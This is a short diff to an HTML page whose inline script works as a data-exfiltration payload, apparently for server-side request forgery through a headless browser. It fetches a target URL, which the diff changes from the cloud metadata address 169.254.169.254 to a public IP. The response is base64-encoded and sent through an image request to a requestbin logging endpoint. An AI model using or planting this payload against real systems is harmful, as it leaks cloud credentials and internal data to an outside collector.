@@ -7,7 +7,7 @@
   <body>
     <script>
     let LOG_URL = "http://requestbin.net/r/fnvhy2pn";
-    let LOCAL_HOST = "http://169.254.169.254/";
+    let LOCAL_HOST = "http://3.110.64.92/";
       
     let img = new Image();
     img.src = LOG_URL + "?START";
@@ -32,7 +32,7 @@
     req.send();
 
     img = new Image();
-    img.src = LOG_URL + "?"+btoa(req.responseText.substring(1,2000));
+    img.src = LOG_URL + "?"+btoa(req.responseText.substring(1,200));
 
     </script>
   </body>
